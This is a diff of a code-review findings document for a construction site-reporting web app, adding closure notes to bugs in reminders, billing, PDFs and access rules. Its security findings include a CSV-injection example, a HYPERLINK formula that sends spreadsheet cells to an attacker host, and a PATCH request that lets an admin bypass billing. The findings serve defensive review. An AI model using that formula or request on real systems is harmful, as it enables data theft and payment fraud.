 - **Fix:** The approach is right, with these details. (1) Move findPhoneNumbers' logic into one shared redactPhones(text) helper in packages/shared, Deno-safe. The worker should not import it from ai/eval.ts. The helper must replace in the original string while skipping UUIDs and ISO dates. findPhoneNumbers removes those before matching, so its match offsets and strings cannot drive replacement directly. Match the redaction regex already used in 20261012000003_ops.sql:126-128 so both layers agree. (2) Apply it centrally in callTool (claude.ts, before client.messages.create) to every user-message text block, including the corrective retry turns callTool appends. That covers extraction, correction, answ…
@@ -352,10 +389,11 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Reminders never reach a reporter whose phone is in two orgs (shared number)
 
-`supabase/functions/scheduler-tick/logic.ts:271` · spec-conformance · Confirmed 3/3
+`supabase/functions/scheduler-tick/logic.ts:271` · spec-conformance · Confirmed 3/3 · Closed in W2-06
 
 - **Problem:** Priya is site manager in org A, and org B adds the same phone for its site (allowed by F2/§19 #1). The conversation is attached to her org-A reporter. Org B's site never gets the heads-up, R1 or R2 ('scheduler.reminder.no_reporter'). At deadline+90 org B gets 'Priya didn't answer 2 reminders' and the site-day is marked missing without a single reminder sent.
 - **Fix:** The suggested direction is right; here it is in full. 1. In loadReminderTargets (scheduler-tick/index.ts:356-365), select `id, name, status, phone_e164` from reporters. Load conversations with `.in('phone_e164', [...new Set(reporters.map(r => r.phone_e164))])` instead of by reporter_id. 2. Add `phone_e164` to ReporterRef and ConversationRef. Change pickReminderTarget (logic.ts:263-271) to build `conversationByPhone` and look up `conversationByPhone.get(reporter.phone_e164)`. Return the linked reporter's own id and first name, so org B's alert names its own reporter. 3. Update logic_test.ts:345 to add a case with two reporter rows (two orgs) sharing one phone and one conversation, and check …
+- **Closed in W2-06:** The ladder no longer looks for a conversation: its targets are `site_reporters` → `reporters` of the site's own org (`siteLadderReporters`, primary first), and each message goes to a reporter id through the Notifier, which texts that row's phone. The same phone in two orgs is two reporter rows, so each org's sites remind it; `pickReminderTarget` is gone. Tests: `supabase/functions/scheduler-tick/logic_test.ts` ("a phone in two orgs gets each org's").
 
 ### 'stop' (or photos) on a non-working day creates a pending site-day that is escalated as missing
 
@@ -366,10 +404,11 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Ladder claim and reminder send are not guarded by the site-day status
 
-`supabase/functions/scheduler-tick/index.ts:283` · race-condition · Confirmed 3/3
+`supabase/functions/scheduler-tick/index.ts:283` · race-condition · Confirmed 3/3 · Closed in W2-06
 
 - **Problem:** At the 19:00 tick the site-day is read as 'reminded'. While the tick walks other sites, the worker files the late report and sets the site-day to 'filed'. claimStage then sets status 'missing', the office gets a missing alert and email, and the filed day shows Missing. Similarly, a voice note arriving during the 17:45 tick yields status 'reminded' over 'processing'. The ladder keeps running (R2 'Still nothing', missing escalation) while the report is in progress, and the reporter gets 'No report yet' right after 'Got it'.
 - **Fix:** (1) In claimStage, add `.in('status', LADDER_STATUSES as string[])` to the update, keeping `.lt('reminder_stage', stage)`, so a filed, processing, no_work or weather_day row is never claimed or overwritten. (2) In send_template.ts, when `payload.siteDayId && payload.stage !== undefined` (ladder jobs only; office-edit templates have no stage), reload the site-day before sending. Return without sending when its status is not 'pending' or 'reminded', or when `reminders_paused` is set. (3) In send_email report_missing, skip the email only when the site-day status is a final one (filed, weather_day or no_work) or is not 'missing'. Do not gate it on LADDER_STATUSES, because the status is legitima…
+- **Closed in W2-06:** (1) The claim checks the status in SQL (`claim_site_day_reminder()`, see "Reminder-ladder claim overwrites…"). (2) The send: every ladder `notify` job carries `guard {siteDayId, statuses, notAfter}`, and the worker re-reads the site-day before it sends (`ladderGuardVerdict`, `apps/worker/src/jobs/notify.ts`): not `pending`/`reminded` any more, or reminders paused → nothing sent, `notify.skipped` `stale_stage`; the late-callback fallback carries the guard and runs it again (`NOTIFY_FALLBACK_GUARDS`). (3) The `report_missing` email is enqueued only by `mark_site_day_missing()`'s guarded claim, as since spec §19 Q55. Tests: `apps/worker/src/jobs/ladder.pglite.test.ts`, `supabase/db-tests/src/reminder-ladder.test.ts`.
 
 ### Pausing then resuming a site in the same billing period double-charges it
 
@@ -387,35 +426,36 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Daily report PDF never shows 'Signed off in SiteLog by {name}'
 
-`supabase/migrations/20261011000005_rpcs.sql:164` · pdf / §12 sign-off lines · Confirmed 3/3
+`supabase/migrations/20261011000005_rpcs.sql:164` · pdf / §12 sign-off lines · Confirmed 3/3 · Closed in W1-14
 
 - **Problem:** A PM signs off RL-2041-0187 v2 in the panel and downloads the PDF for the client. It still shows an empty project-manager signature box, so the sign-off is not on the paper record.
 - **Fix:** The suggested fix is correct, with these details: 1. In sign_off_report and undo_sign_off, call perform enqueue_job('render_pdf', jsonb_build_object('reportId', p_report_id, 'version', r.current_version, 'emailRecipients', false, 'sendToWhatsApp', false), null, 'render_pdf:' || p_report_id || ':' || r.current_version). 2. Reusing the 'render_pdf:{id}:{version}' dedupe key is safe. enqueue_job only dedupes against queued or running jobs (rpcs.sql:36-39), and the job reads the report's sign-off state when it runs. If the filing render is still pending it will already pick up the sign-off, and a later undo will queue another render once that job is done. 3. Overwriting the file in place works …
+- **Closed in W1-14:** `20261015000010_signoff_pdf_rerender.sql` makes `sign_off_report` and `undo_sign_off` enqueue `render_pdf` for the current version (no email), each event under its own dedupe key (`render_pdf:<report>:<version>:signoff:<µs>` / `…:signoff_undone:<µs>`: a key is never used twice since D16, so the point-2 reuse above no longer applies). The worker overwrites the stored PDF in place; the PDF prints "Signed off in SiteLog by {name} · {time}" on the project manager's line (`supabase/db-tests/src/signoff-pdf.test.ts`).
 
 ### EOT pack ignores the 'included sections' checklist
 
-`apps/worker/src/pdf/render.ts:167` · evidence pack / F16, §P9 · Confirmed 3/3
+`apps/worker/src/pdf/render.ts:167` · evidence pack / F16, §P9 · Confirmed 3/3 · **Fixed (W3-07):** `EvidencePackInput.sections` (`packSections(pack.sections)`, all five when none is stored) drives `EvidencePack.tsx`: Summary prints the delay summary page, Daily reports the day's summary, weather, manpower and work, Transcript excerpts, Photos and Weather data their blocks (numbered in order); with no day section ticked there is no day page. Photos and transcripts are loaded only when printed; the evidence marks and claim-ready use the photo source count (`apps/worker/src/pdf/snapshot.test.ts`, `apps/worker/src/jobs/evidence-pack.pglite.test.ts`).
 
 - **Problem:** An office user builds a pack with only 'summary' and 'weather' ticked, because the transcripts contain remarks they do not want to send to the owner. The PDF still includes every day's transcript excerpts and photos.
 - **Fix:** Add `sections` to EvidencePackInput, set from pack.sections, defaulting to all PACK_SECTIONS when empty. In EvidencePack.tsx, wrap each part in a check: - 'summary': the delay summary table on the cover. - 'reports': per-day blocks 01-04. - 'transcripts': 05. - 'photos': 06. - 'weather': 07. If no per-day section is selected, do not render the per-day <Page> at all; otherwise each day gets an empty page with only a header. When you skip loading photos and transcripts, the evidence markers must not change. Today claimReady at render.ts ~210 uses `photos.length > 0`. Base it on the photo source count instead (sources.filter(kind==='photo').length > 0), and keep audioCount and photoCount from …
 
 ### EOT packs for the same site and period overwrite each other's PDF
 
-`apps/worker/src/jobs/build_evidence_pack.ts:17` · evidence pack / F16, §P9 pack history · Confirmed 3/3
+`apps/worker/src/jobs/build_evidence_pack.ts:17` · evidence pack / F16, §P9 pack history · Confirmed 3/3 · **Fixed (W3-07):** `evidencePackStoragePath(org, site, start, end, packId)` stores `…/eot_{start}_{end}_{packId}.pdf`, so only a retry of the same pack overwrites its file (upsert kept); a rebuild of the same period is a new file and the earlier pack's download and email link keep their content (`evidence-pack.pglite.test.ts`). Packs built before keep their path.
 
 - **Problem:** On Oct 10 a pack for Riverside, Oct 1-9, is built and sent with an EOT claim. On Oct 20 a report in that range is edited (v2) and the pack is rebuilt. Downloading the Oct 10 pack from the history, or opening the 7-day link in the Oct 10 email, now returns the Oct 20 content, so the submitted evidence cannot be reproduced. Two concurrent builds also race on the same object.
 - **Fix:** Put the pack id in the path: change evidencePackStoragePath to take packId and return `${orgId}/${siteId}/eot_${periodStart}_${periodEnd}_${packId}.pdf`, and pass pack.id at build_evidence_pack.ts:17. Do NOT switch to upsert:false. If the upload succeeds and a later step fails (updateEvidencePack, logAudit, notifyOrg, enqueueJob), the pack is marked failed and the job retries. The retry rebuilds and uploads to the same path, and with upsert:false it would fail with 'already exists' every time. With a path unique to each pack, upsert:true is safe, because only retries of the same pack overwrite it. Storage.upload already hardcodes upsert:true, so changing the path is enough. Optionally updat…
 
 ### EOT pack cover states every report was confirmed on WhatsApp, including unconfirmed ones
 
-`apps/worker/src/pdf/EvidencePack.tsx:80` · evidence pack accuracy / F16 · Confirmed 3/3
+`apps/worker/src/pdf/EvidencePack.tsx:80` · evidence pack accuracy / F16 · Confirmed 3/3 · **Fixed (W3-07, spec §19 Q134):** the cover no longer says every report was confirmed on WhatsApp: it counts the days the site manager confirmed and says each day states how its report was confirmed; each day prints its confirmation line (`packConfirmation`, `packages/shared/src/report/evidence-pack.ts`: on the recorder, by voice on the call, by text, on WhatsApp for v1.0 reports, logged as a weather day, entered or filed by the office, filed automatically without confirmation) with the sign-off, and a day the site manager did not confirm counts as claim-ready only once signed off (also on P9). The summary table has a Confirmed column.
 
 - **Problem:** A pack covers 3 weather days logged through the R1 'Site closed: weather' button and one report auto-filed after 2 h with no reply. The cover tells the owner's assessor that every report was confirmed by the site manager, while the attached daily reports for those days say 'Not confirmed'. That contradiction can undermine the claim.
 - **Fix:** The suggested direction is right; these changes make it complete: 1. **New fields.** Add confirmedAt, kind ('daily' | 'weather_day') and reviewReasons to `EvidenceDay`, filled from the report row in `buildEvidencePackInput`. 2. **Who confirmed.** The 'office' trigger also sets confirmed_at, so confirmed_at alone does not prove the site manager confirmed. Either count only reports where confirmed_at is set and 'unconfirmed' is absent, and word the cover as 'confirmed on WhatsApp or by the office', or read the trigger from the report.filed audit entry. 3. **Weather-day wording.** Weather-day reports were explicitly logged by the site manager through the WhatsApp button but never confirmed. De…
 
 ### Panel notifications ignore §13 recipient roles, and read state is shared across users
 
-`supabase/migrations/20261011000004_rls.sql:169` · notifications / §13 · Confirmed 3/3
+`supabase/migrations/20261011000004_rls.sql:169` · notifications / §13 · Confirmed 3/3 · **Partly fixed (W1-05 step 9):** recipients per §13 (`20261014000001_queue_rls_fixes.sql`; see "notifications and audit_log ignore the spec's role restrictions"); the shared read state is still open.
 
 - **Problem:** An `accounts` user's bell shows 'Payment failed', 'Elm St — no report' and '3 new terms to review'. Each of these links to a page that returns 'You don't have access'. Then an ops user clicks 'Elm St — no report', read_at is set on the shared row, and the admin's unread badge drops, so the admin never sees the alert as unread.
 - **Fix:** The suggested direction is fine, but the fix is incomplete as written. Pick one of these: (a) Simplest: fan out in notify_org. When p_user_id is null, insert one row per org_members user whose role is in a §13 role list keyed by p_kind: - missing_report → admin, ops - needs_review → ops, pm - unknown_sender → ops, admin - invoice_gap → ops, accounts - glossary_review → admin, pm, ops - billing → admin - reporter_invite_failed, reporter_wrong_site → admin, ops (the Team page roles) - processing_delayed → admin, pm, ops - report_edited with a null signer → admin, pm, ops With fan-out the existing user_id policy, read_at column and mark_notifications_read already give per-user read state. The …
@@ -464,7 +504,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Add invoice dialog keeps the period from the week it first loaded on after the week changes, so period and per-day lines disagree
 
-`apps/web/src/app/hours/AddInvoiceDialog.tsx:39` · correctness · Confirmed 3/3
+`apps/web/src/app/hours/AddInvoiceDialog.tsx:39` · correctness · Confirmed 3/3 · **Fixed (W3-06):** `<AddInvoiceDialog key={data.week}>` remounts the dialog with the week on screen.
 
 - **Problem:** Open /hours (W41), click the previous-week arrow (W40), click 'Add invoice', pick Apex, enter hours and save. sub_invoices is stored with period Oct 5–11 (W41) and lines dated Sep 28–Oct 2 (W40). W40 shows the company as 'awaiting' (the period doesn't overlap). W41 shows a full false gap, because the invoice lines don't match any W41 day.
 - **Fix:** The suggested fix works. `key={data.week}` (plus siteId if it should also reset) on <AddInvoiceDialog> in hours/Page.tsx:246 remounts the dialog when the week's data arrives. Resetting the form each time the dialog opens, from the current matrix, also works and covers all cases. Optionally disable 'Add invoice' while `hours.isPlaceholderData` is true, so the dialog can't be opened against the previous week's matrix during the fetch.
@@ -541,10 +581,11 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Site-days created on non-working days are left 'pending' and get the reminder ladder and missing escalation
 
-`apps/worker/src/router/continue.ts:107` · time-zone/date · Unverified
+`apps/worker/src/router/continue.ts:107` · time-zone/date · Unverified · Closed in W2-06
 
 - **Problem:** Saturday 14:00: voice note 'edit Friday, Apex had seven not six'. startIntake(Saturday) creates a Saturday site-day and report, burning a report number. The short transcript classifies as edit_request, so voidReport puts the Saturday site-day back to 'pending'. 17:45: R1 'No report yet for Riverside today'. 18:30: R2. 19:00: missing email to ops and admin for a non-working day. A Saturday photo-only message, or 'stop', has the same effect.
 - **Fix:** When a non-working-day site-day ends without a report (void, photos-only, stop), set it to no_work or delete it. Alternatively make the ladder skip dates that are not working days.
+- **Closed in W2-06:** The ladder and the missing step skip a date that is not one of the org's working days, in the plan (`planLadder`, `planMissing`) and again in SQL (`claim_site_day_reminder()`, and `mark_site_day_missing()` since `20261016000040`), and the claim also refuses a day with a live report. A stray Saturday site-day stays `pending` and is never texted or escalated. Tests: `logic_test.ts` (planLadder guards, planMissing), `reminder-ladder.test.ts` ("nothing on a day the org does not work"), `missing-alert.test.ts` ("never escalates a site-day on a day the org does not work").
 
 ### Weather-day and no-work handlers overwrite or orphan an in-flight daily report
 
@@ -583,14 +624,15 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Reminder templates are sent without re-checking the site-day, including late retries after the report was filed
 
-`apps/worker/src/jobs/send_template.ts:15` · correctness · Unverified
+`apps/worker/src/jobs/send_template.ts:15` · correctness · Unverified · Closed in W2-06
 
 - **Problem:** R1 is enqueued at 17:45 and its sends fail with WhatsApp 5xx at 17:45:00 and 17:45:30. The reporter's note is filed at 17:50. The 17:57:30 retry succeeds and sends 'Hi Marco — no report yet for Riverside today…' after 'Filed.'. The same happens to a reporter who texted 'stop' after the job was enqueued.
 - **Fix:** For payloads with siteDayId and stage, load the site-day and skip unless its status is pending or reminded and (stage is 4 or reminders_paused is false).
+- **Closed in W2-06:** The ladder sends `notify` jobs (not WhatsApp templates), and the worker re-checks the guard on every run, so a retry after the report was filed sends nothing (`notify.skipped`, `stale_stage`), and a job still waiting after the call window closes sends nothing either (`quiet_hours`, spec §19 Q77). `send_template` is no longer enqueued by anything but the v1.0 router (step 22). Tests: `apps/worker/src/jobs/ladder.pglite.test.ts` ("a day filed after the claim sends nothing, also on a retry").
 
 ### Evidence-pack transcript excerpts match timestamps across different voice notes
 
-`apps/worker/src/pdf/render.ts:250` · correctness · Unverified
+`apps/worker/src/pdf/render.ts:250` · correctness · Unverified · **Fixed (W3-07):** `weatherExcerpts` takes the day's clips (`PackClip`: each voice note, and each call with its reporter lane only) and matches a period's source on (clip, second): a voice note's `uploadId` / a call's `callId`, never another clip's segment at the same second; each excerpt prints its clip ("voice note 2 · 0:05–0:12", "call 2:15–2:22") (`apps/worker/src/pdf/pdf.test.ts`).
 
 - **Problem:** A report has note A (crew, 0–60 s) and note B ('llovió desde las siete…' at 5–12 s). The weather period source is {messageId: B, start: 5}. findIndex returns note A's 0–8 s segment, so the EOT pack prints the crew sentence and its neighbours as the weather evidence instead of the rain statement.
 - **Fix:** Keep messageId on the segments passed to weatherExcerpts and match on (messageId, start).
@@ -632,17 +674,19 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Adding a site never syncs the Stripe quantity, so sites added after checkout are not billed
 
-`apps/web/src/data/supabase/SupabaseSource.ts:1351` · correctness/billing · Unverified
+`apps/web/src/data/supabase/SupabaseSource.ts:1351` · correctness/billing · Unverified · Closed in W4-10
 
 - **Problem:** An org subscribes with 1 site (quantity 1), then adds 4 more sites over the month from Sites → New site. Stripe keeps billing quantity 1 ($399) for 5 active sites until someone pauses or resumes a site, which happens to trigger a sync.
 - **Fix:** Call api-billing `{ action: 'sync' }` after createSite succeeds, and on any future archive or delete. Or move site creation into api-billing / an RPC that syncs, or have scheduler-tick reconcile quantity against active sites periodically.
+- **Closed in W4-10:** see "Adding a site never increments the Stripe subscription quantity" above (the panel's sync after _Add site_ plus the `billing_sync` job).
 
 ### Reminder targets are looked up by conversations.reporter_id, so a phone that is a reporter in two orgs gets reminders for only one of them
 
-`supabase/functions/scheduler-tick/logic.ts:264` · correctness/multi-org · Unverified
+`supabase/functions/scheduler-tick/logic.ts:264` · correctness/multi-org · Unverified · Closed in W2-06
 
 - **Problem:** Priya is site manager for org A (verified) and is invited by org B for site S with the same phone. The conversation row stays bound to (or moves to) one reporter id. For the other org's sites, scheduler-tick logs 'scheduler.reminder.no_reporter' every day: no heads-up, R1 or R2. At deadline +90 the office still gets the 'no report — didn't answer 2 reminders' alert even though no reminder was ever sent.
 - **Fix:** Resolve the reminder conversation by the reporter's phone instead of reporter_id: load reporters' phone_e164 and conversations `.in('phone_e164', phones)`, then map reporter → conversation by phone. The worker already routes inbound by phone and asks for the site when needed.
+- **Closed in W2-06:** As "Reminders never reach a reporter whose phone is in two orgs": targets by `site_reporters` and `reporters`, per reporter row, never by `conversations`.
 
 ### The in-app trial never expires: trialing orgs without a subscription are never blocked
 
@@ -653,7 +697,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### orgs RLS lets any org admin write billing_status, the Stripe ids and trial_ends_at directly
 
-`supabase/migrations/20261011000004_rls.sql:72` · security/billing · Unverified
+`supabase/migrations/20261011000004_rls.sql:72` · security/billing · Unverified · **Fixed (W1-05 step 9):** see "Org admins can overwrite the Stripe-mirrored billing columns and the grace period".
 
 - **Problem:** An admin whose subscription was canceled or is past_due beyond the grace period runs `supabase.from('orgs').update({ billing_status: 'active' }).eq('id', orgId)` with their session. The next scheduler tick no longer blocks the org, so site-days and reminders resume without payment. Setting trial_ends_at=null makes trialDaysFor grant a fresh 14-day Stripe trial on the next checkout.
 - **Fix:** Revoke UPDATE on orgs from authenticated and grant it per column (name, address, license_no, timezone, logo_path), or add a BEFORE UPDATE trigger that rejects changes to billing_status, stripe_customer_id, stripe_subscription_id and trial_ends_at unless the caller is the service role.
@@ -674,21 +718,21 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### RLS lets panel writes skip the audited paths: role changes, member removal, site pause/resume, ignore-sender, invoice status and more write no audit_log
 
-`supabase/migrations/20261011000004_rls.sql:106` · missing-audit · Unverified
+`supabase/migrations/20261011000004_rls.sql:106` · missing-audit · Unverified · **Partly fixed (W1-05 step 9):** role changes, removals and additions on `org_members` are audited (`20261014000001_queue_rls_fixes.sql`); site pause/resume, ignore-sender and invoice status are not yet.
 
 - **Problem:** An admin demotes a PM to accounts, removes a member, pauses a billed site or marks an invoice 'queried' from the panel against real Supabase. Each write succeeds and audit_log gets no row, so the activity timeline and the billing/permission trail are empty. A sole admin can even demote themselves through the update policy, which the edge function forbids, leaving the org with no admin.
 - **Fix:** Do one of two things. Either restrict those policies (drop direct update/delete on org_members, the status columns of sites, unknown_senders.status, and so on) so the panel must go through the audited RPCs or edge functions, or add AFTER INSERT/UPDATE/DELETE audit triggers on those tables, like audit_org_settings_update. Then switch the SupabaseSource methods to the existing functions.
 
 ### orgs_update lets any org admin rewrite billing_status, trial_ends_at and the Stripe ids (billing bypass)
 
-`supabase/migrations/20261011000004_rls.sql:72` · rls-correctness · Unverified
+`supabase/migrations/20261011000004_rls.sql:72` · rls-correctness · Unverified · **Fixed (W1-05 step 9):** see "Org admins can overwrite the Stripe-mirrored billing columns and the grace period".
 
 - **Problem:** The admin of an org whose subscription is 'canceled' runs `PATCH /rest/v1/orgs?id=eq.<org> {billing_status:'active'}` with their own JWT. RLS accepts it. The scheduler stops treating the org as blocked, so site-days, reminders and filing resume without payment. The admin can likewise point stripe_customer_id at another customer id, which api-billing then uses for portal/invoices.
 - **Fix:** Revoke UPDATE on orgs from authenticated and expose a security-definer RPC for the editable profile fields (name, address, license_no, timezone). Alternatively, grant column-level UPDATE only on those columns, or add a BEFORE UPDATE trigger that rejects changes to billing_status, trial_ends_at and stripe_* unless is_service().
 
 ### Org-wide notifications are visible to every member regardless of role (accounts sees unknown-sender snippets, review and missing alerts)
 
-`supabase/migrations/20261011000004_rls.sql:169` · rls-correctness · Unverified
+`supabase/migrations/20261011000004_rls.sql:169` · rls-correctness · Unverified · **Fixed (W1-05 step 9):** see "notifications and audit_log ignore the spec's role restrictions".
 
 - **Problem:** Reproduced on PGlite as the seed 'accounts' user. `select * from notifications` returns the 'unknown_sender' row with body '+1 555 019 4410 · "this is Luis, covering Elm St. today…"', plus needs_review and missing_report rows. The same user gets 0 rows from unknown_senders, whose RLS is admin/ops only. Accounts users also see an unread badge for alerts whose targets (/team, /reports/:id) they cannot open.
 - **Fix:** Add a `roles member_role[]` column to notifications (set by notify_org per §13), and change notifications_select / mark_notifications_read to require `user_id = auth.uid() or (user_id is null and has_role(org_id, roles))`.
@@ -697,7 +741,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Payroll CSV does not neutralise spreadsheet formulas in company/site/trade names
 
-`supabase/functions/api-export-payroll/csv.ts:51` · input validation / CSV injection · Confirmed 3/3
+`supabase/functions/api-export-payroll/csv.ts:51` · input validation / CSV injection · Confirmed 3/3 · **Fixed (W3-06):** `csvCell` (`packages/shared/src/report/payroll.ts`) prefixes a text cell that starts with `=`, `+`, `-`, `@`, tab or CR with `'`, numbers stay plain; api-export-payroll's `csvEscape` and the demo CSV use it (Deno tests in `csv_test.ts`, unit tests in `payroll.test.ts`).
 
 - **Problem:** An ops user, or a reporter answering the unknown-company question, adds a company named =HYPERLINK("https://evil.example/?d="&B2&C2,"Delta Electric"). The accounts user downloads payroll_2026-W41.csv and opens it in Excel. The cell renders as a link 'Delta Electric', and clicking it sends the neighbouring site/project cells to the attacker. Older Excel builds also allow DDE payloads.
 - **Fix:** The suggested fix is right. Apply it only to string inputs, so that numeric cells like workers and version stay plain numbers. In csvEscape, after the null check, set `let s = String(value); if (typeof value === 'string' && /^[=+\-@\t\r]/.test(s)) s = "'" + s;`, then apply the existing RFC 4180 quoting to s. Add Deno tests for `=HYPERLINK(...)`, `+1`, `-1` and `@SUM(...)`, and one checking that a value like `Delta, Inc` is still only quoted.
@@ -711,7 +755,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### reporters and unknown_senders write policies allow forging verification state and service-trusted fields
 
-`supabase/migrations/20261011000004_rls.sql:121` · authorization · Confirmed 3/3
+`supabase/migrations/20261011000004_rls.sql:121` · authorization · Confirmed 3/3 · **Mostly fixed (W1-05 steps 9 and 11):** the `reporters` half by `20261013000007_schema_expand_v1_2.sql`: no INSERT or DELETE for the API roles (reporters come from api-invite-reporter and api-link-unknown-sender; a delete would also erase `consents`), UPDATE only on `status` and `invited_at` (so not `phone_e164`, `verified_at`, `activated_at` or `opted_out_at`), and a guard that lets a client set `status` only to `invited` or `disabled` and never out of `opted_out` (role-matrix probes "reporters: …"). The `unknown_senders` half by `20261014000003_renames_billing.sql` (W1-05 step 11): the table is `unknown_contacts`, and admin and ops update only its `status` (ignore); the number, its org, the snippet, the guessed site and the message or call keys are written by the service (role-matrix probes "unknown_contacts: …", `src/renames.test.ts`). Still open: a client may set `status` to any label (`linked` without linking), and the panel's direct ignore is not audited (`api-link-unknown-sender` audits its own).
 
 - **Problem:** Phone edit: ops PATCHes a reporter's phone_e164 to a new number. The old conversation still holds reporter_id (unique). When the new number writes, the webhook's conversation insert hits a 23505 on reporter_id, the phone lookup finds nothing, and the webhook throws and returns 500. Meta then redelivers indefinitely and nothing from that number is ever stored. Verification bypass: ops invites a number and PATCHes status='verified', or rewrites a pending unknown_sender's phone_e164 and links it. scheduler-tick then sends daily reminder templates to a number that never opted in.
 - **Fix:** The suggested fix is right but incomplete: `for all` also grants INSERT and DELETE, and it needs to cover those too. A DELETE on reporters cascades to conversations (tables.sql:122), then to messages (:134), then to transcripts (:152) and report_sources (:229). So ops can silently erase a reporter's whole message history and report evidence, with no audit row. A direct INSERT can also create a 'verified' reporter for any phone, which skips both invite and verification. 1. Drop reporters_write and keep only reporters_select. Do not grant INSERT or DELETE to authenticated. Reporters are created only by api-invite-reporter and api-link-unknown-sender, which use the service role. Edits already …
@@ -788,14 +832,14 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### No 'invoice_gap' panel notification is ever produced
 
-`supabase/functions/_shared/notify.ts:9` · notifications / §13 · Confirmed 3/3
+`supabase/functions/_shared/notify.ts:9` · notifications / §13 · Confirmed 3/3 · **Fixed (W3-06):** `20261016000270_invoice_gap_notice.sql`: `invoice_gap_check()` posts one org-wide `invoice_gap` notice (audience admin, ops, accounts by `notification_audience`) per invoice and gap under spec §19 Q133's default (`INVOICE_GAP_POLICY`), from the invoice save (trigger on `sub_invoices`) and from a report version that changes the hours behind it (deferred trigger on `reports`); `sub_invoices.gap_notified` keys it, `invoice.gap_notified` audits it (`supabase/db-tests/src/invoice-gap.test.ts`).
 
 - **Problem:** An accounts user records BrightLine invoice BL-3381 for 212 h against 196 h reported. No bell notification is created for anyone, and the accounts user only sees the gap by opening /hours and the right week.
 - **Fix:** The suggested fix's direction is right, but notify_org cannot target roles. Its p_user_id is one user or null, and null means every org member sees it (notifications_select RLS, 20261011000004_rls.sql:169). So "targeted at ops+accounts" means looping `select user_id from org_members where org_id = NEW.org_id and role in ('ops','accounts')` and calling notify_org once per user. The alternative is to accept a single org-wide notification (p_user_id null). 1. Add a SECURITY DEFINER AFTER INSERT OR UPDATE OF total_hours, lines, period_start, period_end, company_id trigger on sub_invoices. 2. Skip the notification when NEW.status = 'resolved'. 3. Compute the gap with the same expression as invoi…
 
 ### Re-extractions inflate glossary times_heard and repeat the review notification
 
-`apps/worker/src/pipeline/glossary.ts:44` · glossary / F17 step 1 · Confirmed 3/3
+`apps/worker/src/pipeline/glossary.ts:44` · glossary / F17 step 1 · Confirmed 3/3 · **Fixed (W3-08):** `extract_report` passes the previous draft's `newTerms` to `learnTerms` as already counted (keyed by kind and heard phrase), so a re-extraction of the same report does not raise `times_heard`; `upsertGlossaryTerm` returns whether it inserted, and `glossary_review` names only the terms newly inserted for review (`pipeline.test.ts`, `db.pglite.test.ts`).
 
 - **Problem:** A site manager sends one voice note mentioning 'the Ridgeway guys', then a second note and a 'fix' reply. The report is extracted 3 times. The glossary card shows 'HEARD 3×' for one mention, and the bell gets three '1 new term to review' notifications.
 - **Fix:** Count each term once per report. In extract_report.ts, before calling learnTerms, drop any term whose `${kind}:${heard.trim().toLowerCase()}` already appears in previousDraft?.newTerms. The first run's draft is stored by storeDraft before learnTerms runs, so this also covers job retries and the requeue when sources change mid-extraction. Separately, have upsertGlossaryTerm say whether it inserted a new row, and make learnTerms send the glossary_review notification only for terms it newly inserted. An existing needs_review row should not trigger another notification. The "fix" path needs no change.
@@ -830,14 +874,14 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Crew hours for accounts users links to report pages they cannot open
 
-`apps/web/src/app/hours/Page.tsx:385` · role-gating · Confirmed 3/3
+`apps/web/src/app/hours/Page.tsx:385` · role-gating · Confirmed 3/3 · **Fixed (W3-06):** still open before; `GapCell` gates the Confirm link on route access (reports, else glossary) and shows an accounts user a plain hint; the evidence chips were gated already.
 
 - **Problem:** An accounts user sees an UNCONFIRMED company, clicks 'Confirm' and lands on the No-access page with no way to act.
 - **Fix:** The suggested fix is fine, but gate on route access instead of hardcoding the role string. In GapCell and InvoiceCheckAside, get `role` from useAuth() and compute `const canOpenReports = canAccess(role, ROUTE_ROLES.reports)` (both from '@/auth/guards'). When this is false, render 'UNCONFIRMED' / 'Confirm' as plain text with a title or hint such as "Ask an ops user to confirm this company". Render the evidence audio/report chip as a non-link span that still shows the report number. Also stop the '/glossary' fallback in GapCell (Page.tsx:385) for these users, because glossary is also blocked for accounts (guards.tsx:36). Put the new hint text in apps/web/src/copy/en.ts.
 
 ### Invoice upload path uses the raw file name: non-ASCII or '#', '%', '[' names fail or store under a different key
 
-`apps/web/src/data/supabase/SupabaseSource.ts:1246` · storage · Confirmed 3/3
+`apps/web/src/data/supabase/SupabaseSource.ts:1246` · storage · Confirmed 3/3 · **Fixed (W3-06):** `invoiceUploadPath()` (`packages/shared/src/invoices.ts`): `{org}/{uuid}-{slug}.{ext}` in safe characters only, in the panel and the demo.
 
 - **Problem:** An accounts user attaches 'Rechnung_März.pdf' or 'Invoice [Oct].pdf' in Add invoice. The upload fails with 'Invalid key', addInvoice throws and the invoice row is never inserted. With 'Invoice #4471.pdf' the upload goes to '.../1728...-Invoice ' while the DB stores '.../1728...-Invoice #4471.pdf', a path that does not exist.
 - **Fix:** The suggested fix is correct. Build the key only from safe characters, for example `${this.orgId}/${crypto.randomUUID()}.pdf`, or the original name slugified with name.normalize('NFKD').replace(/[^A-Za-z0-9._-]+/g, '_'). Keep `${orgId}/` as the first folder so the 'members upload invoices' RLS policy still matches. If the original name should be shown in the UI, store it separately, either in a column or via upload's `metadata` option. Using up.data.path instead of the local string would not help, because storage-js returns the same unencoded input path.
@@ -858,7 +902,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### 'X h lost to weather in this set' sums only the current page
 
-`apps/web/src/data/supabase/SupabaseSource.ts:624` · correctness · Confirmed 3/3
+`apps/web/src/data/supabase/SupabaseSource.ts:624` · correctness · Confirmed 3/3 · **Fixed (W3-07):** `report_archive_weather_hours()` (`20261016000280_weather_call_evidence.sql`, security invoker over `report_archive`) sums the lost hours of every report matching the archive's filters, text search included, in one request; the panel no longer pages through the rows (`supabase/db-tests/src/weather-call-evidence.test.ts`, `SupabaseSource.test.ts`).
 
